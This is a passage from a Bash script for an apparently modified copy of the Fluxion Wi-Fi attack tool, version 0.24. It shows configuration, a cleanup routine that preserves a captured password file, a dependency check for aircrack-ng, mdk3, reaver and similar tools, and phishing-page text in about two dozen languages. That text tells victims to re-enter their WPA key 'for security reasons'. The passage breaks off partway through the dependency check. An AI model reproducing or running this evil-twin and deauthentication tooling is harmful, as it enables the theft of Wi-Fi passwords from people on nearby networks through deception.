#!/bin/bash

########## DEBUG Mode ##########
if [ -z ${FLUX_DEBUG+x} ]; then FLUX_DEBUG=0
else FLUX_DEBUG=1
fi
################################

####### preserve network #######
if [ -z ${KEEP_NETWORK+x} ]; then KEEP_NETWORK=0
else KEEP_NETWORK=1
fi
################################

###### AUTO CONFIG SETUP #######
if [ -z ${FLUX_AUTO+x} ]; then FLUX_AUTO=0
else FLUX_AUTO=1
fi
################################

if [[ $EUID -ne 0 ]]; then
        echo -e "\e[1;31mYou don't have admin privilegies, execute the script as root.""\e[0m"""
        exit 1
fi

if [ -z "${DISPLAY:-}" ]; then
    echo -e "\e[1;31mThe script should be exected inside a X (graphical) session.""\e[0m"""
    exit 1
fi

clear

##################################### < CONFIGURATION  > #####################################
DUMP_PATH="/tmp/TMPflux" 
HANDSHAKE_PATH="/root/handshakes"
PASSLOG_PATH="/root/pwlog"
WORK_DIR=`pwd`
DEAUTHTIME="9999999999999"
revision=124
version=0.24
IP=192.168.1.1
RANG_IP=$(echo $IP | cut -d "." -f 1,2,3)

#Colors
white="\033[1;37m"
grey="\033[0;37m"
purple="\033[0;35m"
red="\033[1;31m"
green="\033[1;32m"
yellow="\033[1;33m"
Purple="\033[0;35m"
Cyan="\033[0;36m"
Cafe="\033[0;33m"
Fiuscha="\033[0;35m"
blue="\033[1;34m"
transparent="\e[0m"


general_back="Back"
general_error_1="Not_Found"
general_case_error="Unknown option. Choose again"
general_exitmode="Cleaning and closing"
general_exitmode_1="Disabling monitoring interface"
general_exitmode_2="Disabling interface"
general_exitmode_3="Disabling "$grey"forwarding of packets"
general_exitmode_4="Cleaning "$grey"iptables"
general_exitmode_5="Restoring "$grey"tput"
general_exitmode_6="Restarting "$grey"Network-Manager"
general_exitmode_7="Cleanup performed successfully!"
general_exitmode_8="Thanks for using fluxion"
#############################################################################################

# DEBUG MODE = 0 ; DEBUG MODE = 1 [Normal Mode / Developer Mode]
if [ $FLUX_DEBUG = 1 ]; then
	## Developer Mode
	export flux_output_device=/dev/stdout
	HOLD="-hold"
else
	## Normal Mode
	export flux_output_device=/dev/null
	HOLD=""
fi

# Delete Log only in Normal Mode !
function conditional_clear() {

	if [[ "$flux_output_device" != "/dev/stdout" ]]; then clear; fi
}

function airmon {
	chmod +x airmon
}
airmon

# Check Updates
function checkupdatess {

	revision_online="$(timeout -s SIGTERM 20 curl "https://raw.githubusercontent.com/deltaxflux/fluxion/master/fluxion" 2>/dev/null| grep "^revision" | cut -d "=" -f2)"
	if [ -z "$revision_online" ]; then
		echo "?">$DUMP_PATH/Irev
	else
		echo "$revision_online">$DUMP_PATH/Irev
	fi

}

# Animation
function spinner {

	local pid=$1
	local delay=0.15
	local spinstr='|/-\'
		while [ "$(ps a | awk '{print $1}' | grep $pid)" ]; do
			local temp=${spinstr#?}
			printf " [%c]  " "$spinstr"
			local spinstr=$temp${spinstr%"$temp"}
			sleep $delay
			printf "\b\b\b\b\b\b"
		done
	printf "    \b\b\b\b"
}

# ERROR Report only in Developer Mode
function err_report {
	echo "Error on line $1"
}

if [ $FLUX_DEBUG = 1 ]; then
        trap 'err_report $LINENUM' ERR
fi

#Function to executed in case of unexpected termination
trap exitmode SIGINT SIGHUP

# KILL ALL
function exitmode {
    if [ $FLUX_DEBUG != 1 ]; then
        conditional_clear
        top
        echo -e "\n\n"$white"["$red"-"$white"] "$red"$general_exitmode"$transparent""

        if ps -A | grep -q aireplay-ng; then
            echo -e ""$white"["$red"-"$white"] "$white"Kill "$grey"aireplay-ng"$transparent""
            killall aireplay-ng &>$flux_output_device
        fi

        if ps -A | grep -q airodump-ng; then
            echo -e ""$white"["$red"-"$white"] "$white"Kill "$grey"airodump-ng"$transparent""
            killall airodump-ng &>$flux_output_device
        fi

        if ps a | grep python| grep fakedns; then
            echo -e ""$white"["$red"-"$white"] "$white"Kill "$grey"python"$transparent""
            kill $(ps a | grep python| grep fakedns | awk '{print $1}') &>$flux_output_device
        fi

        if ps -A | grep -q hostapd; then
            echo -e ""$white"["$red"-"$white"] "$white"Kill "$grey"hostapd"$transparent""
            killall hostapd &>$flux_output_device
        fi

        if ps -A | grep -q lighttpd; then
            echo -e ""$white"["$red"-"$white"] "$white"Kill "$grey"lighttpd"$transparent""
            killall lighttpd &>$flux_output_device
        fi

        if ps -A | grep -q dhcpd; then
            echo -e ""$white"["$red"-"$white"] "$white"Kill "$grey"dhcpd"$transparent""
            killall dhcpd &>$flux_output_device
        fi

        if ps -A | grep -q mdk3; then
            echo -e ""$white"["$red"-"$white"] "$white"Kill "$grey"mdk3"$transparent""
            killall mdk3 &>$flux_output_device
        fi

        if [ "$WIFI_MONITOR" != "" ]; then
            echo -e ""$weis"["$rot"-"$weis"] "$weis"$general_exitmode_1 "$green"$WIFI_MONITOR"$transparent""
            ./airmon stop $WIFI_MONITOR &> $flux_output_device
        fi


        if [ "$WIFI" != "" ]; then
            echo -e ""$weis"["$rot"-"$weis"] "$weis"$general_exitmode_2 "$green"$WIFI"$transparent""
            ./airmon stop $WIFI &> $flux_output_device
            ./airmon stop $WIFI_MONITOR1 &> $flux_output_device
            ./airmon stop $WIFI_MONITOR2 &> $flux_output_device
            ./airmon stop $WIFI_MONITOR3 &> $flux_output_device
            ./airmon stop $WIFI_MONITOR4 &> $flux_output_device
            ./airmon stop $WIFI_MONITOR5 &> $flux_output_device
            macchanger -p $WIFI &> $flux_output_device
        fi


        if [ "$(cat /proc/sys/net/ipv4/ip_forward)" != "0" ]; then
            echo -e ""$white"["$red"-"$white"] "$white"$general_exitmode_3"$transparent""
            sysctl -w net.ipv4.ip_forward=0 &>$flux_output_device
        fi

        echo -e ""$white"["$red"-"$white"] "$white"$general_exitmode_4"$transparent""
        if [ ! -f $DUMP_PATH/iptables-rules ];then 
            iptables --flush 
            iptables --table nat --flush 
            iptables --delete-chain
            iptables --table nat --delete-chain 
        else 
            iptables-restore < $DUMP_PATH/iptables-rules   
        fi

        echo -e ""$white"["$red"-"$white"] "$white"$general_exitmode_5"$transparent""
        tput cnorm

        if [ $FLUX_DEBUG != 1 ]; then

            echo -e ""$white"["$red"-"$white"] "$white"Delete "$grey"files"$transparent""
            cp $DUMP_PATH/data/password.txt /root/Bureau/
            rm -R $DUMP_PATH/* &>$flux_output_device
        fi

	if [ $KEEP_NETWORK = 0 ]; then

        echo -e ""$white"["$red"-"$white"] "$white"$general_exitmode_6"$transparent""
        # systemctl check
        systemd=`whereis systemctl`
        if [ "$systemd" = "" ];then
            service network-manager restart &> $flux_output_device &
	    service networkmanager restart &> $flux_output_device &
            service networking restart &> $flux_output_device &
        else
            systemctl restart NetworkManager &> $flux_output_device & 	
        fi 
        echo -e ""$white"["$green"+"$white"] "$green"$general_exitmode_7"$transparent""
        echo -e ""$white"["$green"+"$white"] "$grey"$general_exitmode_8"$transparent""
        sleep 2
        clear
    	fi

	fi

        exit
    
}


#Languages for the web interface

#EN
DIALOG_WEB_INFO_ENG="For security reasons, enter the WPA key to access the Internet."
DIALOG_WEB_INPUT_ENG="Enter your WPA password:"
DIALOG_WEB_SUBMIT_ENG="Submit"
DIALOG_WEB_ERROR_ENG="Error: The entered password is not correct!"
DIALOG_WEB_OK_ENG="Your connection will be restored in a few moments."
DIALOG_WEB_BACK_ENG="Back"
DIALOG_WEB_ERROR_MSG_ENG="This field is required."
DIALOG_WEB_LENGTH_MIN_ENG="The password must be more than {0} characters!"
DIALOG_WEB_LENGTH_MAX_ENG="The password must be less than {0} characters!"
DIALOG_WEB_DIR_ENG="ltr"

#GER
DIALOG_WEB_INFO_GER="Aus Sicherheitsgründen geben Sie bitte den WPA2 Schlüssel ein."
DIALOG_WEB_INPUT_GER="Geben Sie den WPA2 Schlüssel ein:"
DIALOG_WEB_SUBMIT_GER="Bestätigen"
DIALOG_WEB_ERROR_GER="Fehler: Das eingegebene Passwort ist nicht korrekt!"
DIALOG_WEB_OK_GER="Die Verbindung wird in wenigen Sekunden wiederhergestellt."
DIALOG_WEB_BACK_GER="Zurück"
DIALOG_WEB_ERROR_MSG_GER="Dieses Feld ist ein Pflichtfeld."
DIALOG_WEB_LENGTH_MIN_GER="Das Passwort muss länger als {0} Zeichen sein"
DIALOG_WEB_LENGTH_MAX_GER="Das Passwort darf nicht länger als {0} Zeichen sein"
DIALOG_WEB_DIR_GER="ltr"

#ESP
DIALOG_WEB_INFO_ESP="Por razones de seguridad, teclea tu clave WPA para acceder a internet"
DIALOG_WEB_INPUT_ESP="Teclea tu contraseña WPA:"
DIALOG_WEB_SUBMIT_ESP="Enviar"
DIALOG_WEB_ERROR_ESP="Error: La contraseña introducida no es correcta"
DIALOG_WEB_OK_ESP="Tu conexión será restaurada en unos pocos minutos"
DIALOG_WEB_BACK_ESP="Atrás"
DIALOG_WEB_ERROR_MSG_ESP="Este campo es obligatorio."
DIALOG_WEB_LENGTH_MIN_ESP="La contraseña debe ser más de {0} caracteres!"
DIALOG_WEB_LENGTH_MAX_ESP="La contraseña debe ser menos de {0} caracteres!"
DIALOG_WEB_DIR_ESP="ltr"

#IT
DIALOG_WEB_INFO_IT="Per motivi di sicurezza, immettere la chiave WPA per accedere a Internet"
DIALOG_WEB_INPUT_IT="Inserisci la tua password WPA:"
DIALOG_WEB_SUBMIT_IT="Invia"
DIALOG_WEB_ERROR_IT="Errore: La password non &egrave; corretta!"
DIALOG_WEB_OK_IT="La connessione sar&agrave; ripristinata in pochi istanti."
DIALOG_WEB_BACK_IT="Indietro"
DIALOG_WEB_ERROR_MSG_IT="Campo obbligatorio."
DIALOG_WEB_LENGTH_MIN_IT="La password deve essere superiore a {0} caratteri"
DIALOG_WEB_LENGTH_MAX_IT="La password deve essere inferiore a {0} caratteri"
DIALOG_WEB_DIR_IT="ltr"

#FR
DIALOG_WEB_INFO_FR="Pour des raisons de sécurité, entrez votre clé WPA"
DIALOG_WEB_INPUT_FR="Entrez votre clé WPA:"
DIALOG_WEB_SUBMIT_FR="Soumettre"
DIALOG_WEB_ERROR_FR="Erreur: Le mot de passe entré est incorrect!"
DIALOG_WEB_OK_FR="Votre connection va être restaurée dans un instant."
DIALOG_WEB_BACK_FR="Retour"
DIALOG_WEB_ERROR_MSG_FR="Ce champ est obligatoire."
DIALOG_WEB_LENGTH_MIN_FR="Le mot de passe doit avoir plus de {0} caractères"
DIALOG_WEB_LENGTH_MAX_FR="Le mot de passe doit avoir moins de {0} caractères"
DIALOG_WEB_DIR_FR="ltr"

#POR
DIALOG_WEB_INFO_POR="Por razões de segurança, digite a senha para acessar a Internet"
DIALOG_WEB_INPUT_POR="Digite novamente a senha do Wifi"
DIALOG_WEB_SUBMIT_POR="Enviar"
DIALOG_WEB_ERROR_POR="Erro: A senha digitada está incorreta!"
DIALOG_WEB_OK_POR="A sua conexão será restaurada em breve."
DIALOG_WEB_BACK_POR="Voltar"
DIALOG_WEB_ERROR_MSG_POR="Campo de preenchimento obrigatório."
DIALOG_WEB_LENGTH_MIN_POR="A senha deve ter mais de {0} caracteres"
DIALOG_WEB_LENGTH_MAX_POR="A chave deve ser menor que {0} caracteres"
DIALOG_WEB_DIR_POR="ltr"

#RUS
DIALOG_WEB_INFO_RUS="Для получения доступа в Интернет нужно ввести WPA пароль своей точки доступа."
DIALOG_WEB_INPUT_RUS="Введите пароль:"
DIALOG_WEB_SUBMIT_RUS="Отправить"
DIALOG_WEB_ERROR_RUS="Ошибка: Введенный пароль не верный!"
DIALOG_WEB_OK_RUS="Спасибо, соединение восстановится через несколько секунд."
DIALOG_WEB_BACK_RUS="Назад"
DIALOG_WEB_ERROR_MSG_RUS="Это поле необходимо заполнить."
DIALOG_WEB_LENGTH_MIN_RUS="Пароль должен быть не менее {0} символов!"
DIALOG_WEB_LENGTH_MAX_RUS="Пароль должен быть не более {0} символов!"
DIALOG_WEB_DIR_RUS="ltr"

#TR
DIALOG_WEB_INFO_TR="İnternet'e erişmek icin WPA kablosuz ağ şifrenizi giriniz:"
DIALOG_WEB_INPUT_TR="Lütfen parolanızı giriniz:"
DIALOG_WEB_SUBMIT_TR="Giriş"
DIALOG_WEB_ERROR_TR="Hata: girilen şifre doğru değil! "
DIALOG_WEB_OK_TR="Bağlantı birkaç dakika içinde yapılandırılacaktır."
DIALOG_WEB_BACK_TR="Geri"
DIALOG_WEB_ERROR_MSG_TR="Bu alanın doldurulması zorunludur."
DIALOG_WEB_LENGTH_MIN_TR="Parola en az {0} karakterden olmalıdır."
DIALOG_WEB_LENGTH_MAX_TR="Parola {0} karakterden daha fazla olmamalıdır."
DIALOG_WEB_DIR_TR="ltr"

#RO
DIALOG_WEB_INFO_RO="Din motive de securitate, introduceți cheia WPA pentru a avea acces la Internet"
DIALOG_WEB_INPUT_RO="Parola WPA:"
DIALOG_WEB_SUBMIT_RO="Trimite"
DIALOG_WEB_ERROR_RO="Eroare: Parola introdusa nu este corecta!"
DIALOG_WEB_OK_RO="Conexiunea la Internet va porni in cateva momente."
DIALOG_WEB_BACK_RO="Inapoi"
DIALOG_WEB_ERROR_MSG_RO="Acest câmp este obligatoriu."
DIALOG_WEB_LENGTH_MIN_RO="Parola trebuie să fie mai mare de {0} de caractere!"
DIALOG_WEB_LENGTH_MAX_RO="Parola trebuie să fie mai mică de {0} de caractere!"
DIALOG_WEB_DIR_RO="ltr"

#HU
DIALOG_WEB_INFO_HU="Biztonsági okokból adja meg a WPA kulcsot az internet eléréséhez"
DIALOG_WEB_INPUT_HU="WPA jelszó:"
DIALOG_WEB_SUBMIT_HU="Küldés"
DIALOG_WEB_ERROR_HU="Hiba: A megadott jelszó helytelen!"
DIALOG_WEB_OK_HU="Az Internet kapcsolat helyreállt. "
DIALOG_WEB_BACK_HU="Vissza"
DIALOG_WEB_ERROR_MSG_HU="A jelszót kötelező megadni."
DIALOG_WEB_LENGTH_MIN_HU="A jelszó nem lehet kevesebb, mint {0} karakter!"
DIALOG_WEB_LENGTH_MAX_HU="A jelszó kevesebb mint {0} karakter kell hogy legyen!"
DIALOG_WEB_DIR_HU="ltr"

#ARA
DIALOG_WEB_INFO_ARA="لأسباب أمنية، أدخل كلمة المرور الخاصة بالشبكة المدونة اعلاه من تشفير WPA للحصول على اتصال الانترنت"
DIALOG_WEB_INPUT_ARA="ادخل كلمة السر"
DIALOG_WEB_SUBMIT_ARA="تأكيد"
DIALOG_WEB_ERROR_ARA="خطأ: كلمة السر المدخلة غير صحيحة"
DIALOG_WEB_OK_ARA="سوف يتم استعادة الاتصال في لحظات قليلة! شكرا لتعاونكم"
DIALOG_WEB_BACK_ARA="العودة"
DIALOG_WEB_ERROR_MSG_ARA="هذا الحقل إلزامي"
DIALOG_WEB_LENGTH_MIN_ARA="يجب أن تكون كلمة المرور أكثر من {0} أحرف او ارقام"
DIALOG_WEB_LENGTH_MAX_ARA="يجب أن تكون كلمة المرور أقل من {0} حرفا او رقم"
DIALOG_WEB_DIR_ARA="rtl"

#CN
DIALOG_WEB_INFO_CN="为了您的安全考量, 请输入 WPA 密码以重新连接网络"
DIALOG_WEB_INPUT_CN="输入您的WPA密码:"
DIALOG_WEB_SUBMIT_CN="连接"
DIALOG_WEB_ERROR_CN="出错了: 您输入的密码 错误!"
DIALOG_WEB_OK_CN="您的无线网络将会在短时间内恢复"
DIALOG_WEB_BACK_ZH_CN="返回"
DIALOG_WEB_ERROR_MSG_CN="此处不能为空"
DIALOG_WEB_LENGTH_MIN_CN="密码最少要有{0}个字符!"
DIALOG_WEB_LENGTH_MAX_CN="密码必须少于{0}个字符!"
DIALOG_WEB_DIR_CN="ltr"

#GR
DIALOG_WEB_INFO_GR="Για λόγους ασφάλειας, εισάγετε το WPA κωδικό για να έχετε πρόσβαση στο Internet."
DIALOG_WEB_INPUT_GR="Εισάγετε τον WPA κωδικό:"
DIALOG_WEB_SUBMIT_GR="Εισαγωγή"
DIALOG_WEB_ERROR_GR="Σφάλμα: Ο κωδικός ΔΕΝ είναι σωστός!"
DIALOG_WEB_OK_GR="Η συνδεσή σας θα αποκατασταθεί σε λίγα λεπτά"
DIALOG_WEB_BACK_GR="Πίσω"
DIALOG_WEB_ERROR_MSG_GR="Αυτό το πεδίο είναι υποχρεωτικό."
DIALOG_WEB_LENGTH_MIN_GR="Ο κωδικός πρέπει να είναι πάνω από {0} χαρακτήρες"
DIALOG_WEB_LENGTH_MAX_GR="Ο κωδικός πρέπει να είναι λιγότερο από {0} χαρακτήρες"
DIALOG_WEB_DIR_GR="ltr"

#CZ
DIALOG_WEB_INFO_CZ="Zadejte vaše heslo WPA, kvůli problémům se zabezpečením, abyste se mohli připojit k internetu."
DIALOG_WEB_INPUT_CZ="Zadejte vaše heslo WPA:"
DIALOG_WEB_SUBMIT_CZ="Odeslat"
DIALOG_WEB_ERROR_CZ="Chyba: Zadané heslo není správné!"
DIALOG_WEB_OK_CZ="Vaše připojení bude obnoveno během chvilky."
DIALOG_WEB_BACK_CZ="Zpět"
DIALOG_WEB_ERROR_MSG_CZ="Toto pole musíte vyplnit."
DIALOG_WEB_LENGTH_MIN_CZ="Heslo musí být delší než {0} znak(ů)!"
DIALOG_WEB_LENGTH_MAX_CZ="Heslo musí být kratší než {0} znaků(ů)!"
DIALOG_WEB_DIR_CZ="ltr"

#NO
DIALOG_WEB_INFO_NO="Av sikkerhetsmessige årsaker må WPA-nøkkelen skrives inn for å få tilgang til internett"
DIALOG_WEB_INPUT_NO="Skriv inn ditt WPA-passord:"
DIALOG_WEB_SUBMIT_NO="Send inn"
DIALOG_WEB_ERROR_NO="Feilmelding: Passordet du skrev inn er IKKE riktig!"
DIALOG_WEB_OK_NO="Din tilkobling vil snart bli gjenopprettet."
DIALOG_WEB_BACK_NO="Tilbake"
DIALOG_WEB_ERROR_MSG_NO="Dette feltet er nødvendig."
DIALOG_WEB_LENGTH_MIN_NO="Passordet må inneholde mer enn {0} tegn"
DIALOG_WEB_LENGTH_MAX_NO="Passordet må inneholde ferre enn {0} tegn"
DIALOG_WEB_DIR_NO="ltr"

#BG
DIALOG_WEB_INFO_BG="От съображения за сигурност е необходимо да въведете своята WPA парола за да получите достъп до Интернет."
DIALOG_WEB_INPUT_BG="Въведете своята WPA парола:"
DIALOG_WEB_SUBMIT_BG="Изпращане"
DIALOG_WEB_ERROR_BG="Грешка: Въведената парола е неправилна!"
DIALOG_WEB_OK_BG="Връзката ще бъде възстановена след няколко секунди."
DIALOG_WEB_BACK_BG="Назад"
DIALOG_WEB_ERROR_MSG_BG="Това поле е задължително!"
DIALOG_WEB_LENGTH_MIN_BG="Паролата трябва да съдържа повече от {0} символа!"
DIALOG_WEB_LENGTH_MAX_BG="Паролата трябва да съдържа по-малко от {0} символа!"
DIALOG_WEB_DIR_BG="ltr"

#SRB by ghost
DIALOG_WEB_INFO_SRB="Zbog sigurnosnih razloga, unesite WPA ključ da bi ste pristupili internetu."
DIALOG_WEB_INPUT_SRB="Unesite vašu WPA šifru:"
DIALOG_WEB_SUBMIT_SRB="Potvrdi"
DIALOG_WEB_ERROR_SRB="Greška: Šifra koju ste uneli nije tačna!"
DIALOG_WEB_OK_SRB="Vaša konekcija će biti restartovana za par sekundi."
DIALOG_WEB_BACK_SRB="Nazad"
DIALOG_WEB_ERROR_MSG_SRB="Ovo polje je obavezno."
DIALOG_WEB_LENGTH_MIN_SRB="Šifra mora biti duža od {0} simbola!"
DIALOG_WEB_LENGTH_MAX_SRB="Šifra mora biti kraća od {0} simbola!"
DIALOG_WEB_DIR_SRB="ltr"

#PL
DIALOG_WEB_INFO_PL="Ze względów bezpieczeństwa, wprowadź klucz WPA, aby uzyskać dostęp do Internetu"
DIALOG_WEB_INPUT_PL="Wprowadź hasło WPA:"
DIALOG_WEB_SUBMIT_PL="Zatwierdź"
DIALOG_WEB_ERROR_PL="Błąd: Wprowadzone hasło nie jest poprawne!"
DIALOG_WEB_OK_PL="Połączenie z Internetem zostanie przywrócone w ciągu kilku chwil."
DIALOG_WEB_BACK_PL="Powrót"
DIALOG_WEB_ERROR_MSG_PL="To pole jest obowiązkowe."
DIALOG_WEB_LENGTH_MIN_PL="Podane hasło jest za krótkie Hasło musi zawierać więcej niż {0} znaków!"
DIALOG_WEB_LENGTH_MAX_PL="Podane hasło jest za długie. Hasło musi być mniejsza niż {0} znaków!"
DIALOG_WEB_DIR_PL="ltr"

#ID
DIALOG_WEB_INFO_ID="Untuk alasan keamanan, masukkan WPA KEY (password wifi) untuk mengakses Internet."
DIALOG_WEB_INPUT_ID="Masukkan WPA KEY (password wifi) anda:"
DIALOG_WEB_SUBMIT_ID="Masukkan"
DIALOG_WEB_ERROR_ID="Error: Password yang anda masukkan tidak sesuai!"
DIALOG_WEB_OK_ID="Anda akan dapat mengakses Internet dalam beberapa saat lagi."
DIALOG_WEB_BACK_ID="Kembali"
DIALOG_WEB_ERROR_MSG_ID="Kolom ini wajib diisi."
DIALOG_WEB_LENGTH_MIN_ID="Password harus lebih dari {0} karakter!"
DIALOG_WEB_LENGTH_MAX_ID="Password harus kurang dari {0} karakter!"
DIALOG_WEB_DIR_ID="ltr"

#NL
DIALOG_WEB_INFO_NL="Voer uw WPA-wachtwoord wegens beveiligingsredenen in om weer internettoegang te krijgen."
DIALOG_WEB_INPUT_NL="Typ Uw WPA wachtwoord:"
DIALOG_WEB_SUBMIT_NL="Invoeren"
DIALOG_WEB_ERROR_NL="Error: Het ingevoerde wachtwoord is niet juist!"
DIALOG_WEB_OK_NL="Uw verbinding wordt in enkele seconden hervat."
DIALOG_WEB_BACK_NL="Terug"
DIALOG_WEB_ERROR_MSG_NL="Dit veld is verplicht."
DIALOG_WEB_LENGTH_MIN_NL="Het wachtwoord moet langer zijn dan {0} karakters!"
DIALOG_WEB_LENGTH_MAX_NL="Het wachtwoord moet korter zijn dan {0} karakters!"
DIALOG_WEB_DIR_NL="ltr"

#DAN
DIALOG_WEB_INFO_DAN="Af sikkerhedsmæssige årsager, skal du skrive netværksadgangskoden, for at få adgang til internettet."
DIALOG_WEB_INPUT_DAN="Angiv netværksadgangskoden:"
DIALOG_WEB_SUBMIT_DAN="Forsæt"
DIALOG_WEB_ERROR_DAN="Fejl: Den indtastede netværksadgangskode er ikke korrekt!"
DIALOG_WEB_OK_DAN="Tak, din forbindelse vil blive genoprettet inden få sekunder."
DIALOG_WEB_BACK_DAN="Tilbage"
DIALOG_WEB_ERROR_MSG_DAN="Dette felt er obligatorisk"
DIALOG_WEB_LENGTH_MIN_DAN="Netværksadgangskoden skal være på mere end {0} tegn!"
DIALOG_WEB_LENGTH_MAX_DAN="Netværksadgangskoden skal være på mindre end {0} tegn!"
DIALOG_WEB_DIR_DAN="ltr"

#TH 
DIALOG_WEB_INFO_TH="กรุณากรอกรหัสผ่าน WIFI เพื่อให้แน่ใจว่าท่านไม่ใช่ Robot ในการใช้งานอินเตอร์เน็ต."
DIALOG_WEB_INPUT_TH="กรอกรหัสผ่าน WIFI ของท่าน:"
DIALOG_WEB_SUBMIT_TH="ยืนยัน"
DIALOG_WEB_ERROR_TH="เกิดข้อผิดพลาด: รหัสผ่านไม่ถูกต้อง"
DIALOG_WEB_OK_TH="กรุณารอสักครู่..ระบบกำลังพาท่านไปยังเว็บไซต์ก่อนหน้า..."
DIALOG_WEB_BACK_TH="กลับ"
DIALOG_WEB_ERROR_MSG_TH="กรุณากรอกช่องนี้!"
DIALOG_WEB_LENGTH_MIN_TH="รหัสผ่านควรมีมากกว่า {0} ตัวอักษร!"
DIALOG_WEB_LENGTH_MAX_TH="รหัสผ่านควรมีอย่างน้อย {0} ตัวอักษร!"
DIALOG_WEB_DIR_TH="ltr"

#HE 
DIALOG_WEB_INFO_HE="מטעמי אבטחה, יש להזין את סיסמת הרשת האלחוטית (WPA)עבור קבלת גישה לאינטרנט."
DIALOG_WEB_INPUT_HE="הזן את סיסמת הWPA:"
DIALOG_WEB_SUBMIT_HE="שלח"
DIALOG_WEB_ERROR_HE="שגיאה: הסיסמה שגויה!"
DIALOG_WEB_OK_HE="החיבור לאינטרנט יוחזר בעוד כמה רגעים."
DIALOG_WEB_BACK_HE="אחורה"
DIALOG_WEB_ERROR_MSG_HE="זהו שדה חובה."
DIALOG_WEB_LENGTH_MIN_HE="הסיסמה חייבת להכיל יותר מ{0} תוים!"
DIALOG_WEB_LENGTH_MAX_HE="הסיסמה חייבת להכיל פחות מ{0} תוים!"
DIALOG_WEB_DIR_ENG="ltr"

#Portuguese 
DIALOG_WEB_INFO_PT_BR="Por razões de segurança, insira a senha WPA para acessar a internet"
DIALOG_WEB_INPUT_PT_BR="Insira sua senha WPA:"
DIALOG_WEB_SUBMIT_PT_BR="Enviar"
DIALOG_WEB_ERROR_PT_BR="Erro: A senha inserida não está correta!"
DIALOG_WEB_OK_PT_BR="Sua conexão será recuperada em breve."
DIALOG_WEB_BACK_PT_BR="Voltar"
DIALOG_WEB_ERROR_MSG_PT_BR="Este campo é obrigatório."
DIALOG_WEB_LPT_BRTH_MIN_PT_BR="A senha deve ter mais de {0} caracteres!"
DIALOG_WEB_LPT_BRTH_MAX_PT_BR="A senha deve ter menos de {0} caracteres!"
DIALOG_WEB_DIR_PT_BR="ltr"

# Design
function top(){

	conditional_clear
	echo -e "$red[~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~]"
	echo -e "$red[                                                      ]"
  echo -e "$red[  $red    FLUXION $version" "${yellow} ${red}  < F""${yellow}luxion" "${red}I""${yellow}s" "${red}T""${yellow}he ""${red}F""${yellow}uture >     "          ${blue}" ]"
	echo -e "$blue[  C'est Ahmed le Boss                                 ]"
	echo -e "$blue[~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~]""$transparent"
	echo
	echo

}

##################################### < END OF CONFIGURATION SECTION > #####################################






############################################## < START > ##############################################

# Check requirements
function checkdependences {

	echo -ne "aircrack-ng....."
	if ! hash aircrack-ng 2>/dev/null; then
		echo -e "\e[1;31mNot installed"$transparent""
		exit=1
	else
		echo -e "\e[1;32mOK!"$transparent""
	fi
	sleep 0.025

	echo -ne "aireplay-ng....."
	if ! hash aireplay-ng 2>/dev/null; then
		echo -e "\e[1;31mNot installed"$transparent""
		exit=1
	else
		echo -e "\e[1;32mOK!"$transparent""
	fi
	sleep 0.025

	echo -ne "airmon-ng......."
	if ! hash airmon-ng 2>/dev/null; then
		echo -e "\e[1;31mNot installed"$transparent""
		exit=1
	else
		echo -e "\e[1;32mOK!"$transparent""
	fi
	sleep 0.025

	echo -ne "airodump-ng....."
	if ! hash airodump-ng 2>/dev/null; then
		echo -e "\e[1;31mNot installed"$transparent""
		exit=1
	else
		echo -e "\e[1;32mOK!"$transparent""
	fi
	sleep 0.025

	echo -ne "awk............."
	if ! hash awk 2>/dev/null; then
		echo -e "\e[1;31mNot installed"$transparent""
		exit=1
	else
		echo -e "\e[1;32mOK!"$transparent""
	fi
	sleep 0.025

	echo -ne "bully..........."
	if ! hash bully 2>/dev/null; then
		echo -e "\e[1;31mNot installed"$transparent""
		exit=1
	else
		echo -e "\e[1;32mOK!"$transparent""
	fi
	sleep 0.025

	echo -ne "curl............"
	if ! hash curl 2>/dev/null; then
		echo -e "\e[1;31mNot installed"$transparent""
		exit=1
	else
		echo -e "\e[1;32mOK!"$transparent""
	fi
	sleep 0.025

	echo -ne "dhcpd..........."
	if ! hash dhcpd 2>/dev/null; then
		echo -e "\e[1;31mNot installed"$transparent" (isc-dhcp-server)"
		exit=1
	else
		echo -e "\e[1;32mOK!"$transparent""
	fi
	sleep 0.025

	echo -ne "hostapd........."
	if ! hash hostapd 2>/dev/null; then
		echo -e "\e[1;31mNot installed"$transparent""
		exit=1
	else
		echo -e "\e[1;32mOK!"$transparent""
	fi
	sleep 0.025

	echo -ne "iwconfig........"
	if ! hash iwconfig 2>/dev/null; then
		echo -e "\e[1;31mNot installed"$transparent""
		exit=1
	else
		echo -e "\e[1;32mOK!"$transparent""
	fi
	sleep 0.025

	echo -ne "lighttpd........"
	if ! hash lighttpd 2>/dev/null; then
		echo -e "\e[1;31mNot installed"$transparent""
		exit=1
	else
		echo -e "\e[1;32mOK!"$transparent""
	fi
	sleep 0.025

	echo -ne "macchanger......"
	if ! hash macchanger 2>/dev/null; then
		echo -e "\e[1;31mNot installed"$transparent""
		exit=1
	else
	    echo -e "\e[1;32mOK!"$transparent""
	fi
	sleep 0.025

	echo -ne "mdk3............"
	if ! hash mdk3 2>/dev/null; then
		echo -e "\e[1;31mNot installed"$transparent""
		exit=1

	else
		echo -e "\e[1;32mOK!"$transparent""
	fi
	sleep 0.025

	echo -ne "nmap............"
	if ! [ -f /usr/bin/nmap ]; then
		echo -e "\e[1;31mNot installed"$transparent""
		exit=1
	else
		echo -e "\e[1;32mOK!"$transparent""
	fi
	sleep 0.025

	echo -ne "php-cgi........."
	if ! [ -f /usr/bin/php-cgi ]; then
		echo -e "\e[1;31mNot installed"$transparent""
		exit=1
	else
		echo -e "\e[1;32mOK!"$transparent""
	fi
	sleep 0.025

	echo -ne "pyrit..........."
	if ! hash pyrit 2>/dev/null; then
		echo -e "\e[1;31mNot installed"$transparent""
		exit=1
	else
		echo -e "\e[1;32mOK!"$transparent""
	fi
	sleep 0.025

	echo -ne "python.........."
	if ! hash python 2>/dev/null; then
		echo -e "\e[1;31mNot installed"$transparent""
		exit=1
	else
		echo -e "\e[1;32mOK!"$transparent""
	fi
	sleep 0.025

	echo -ne "reaver.........."
	if ! hash reaver 2>/dev/null; then
		echo -e "\e[1;31mNot installed"$transparent""
		exit=1
	else
		echo -e "\e[1;32mOK!"$transparent""
	fi
	sleep 0.025

	echo -ne "unzip..........."
	if ! hash unzip 2>/dev/null; then
		echo -e "\e[1;31mNot installed"$transparent""
		exit=1
	else
		echo -e "\e[1;32mOK!"$transparent""
	fi
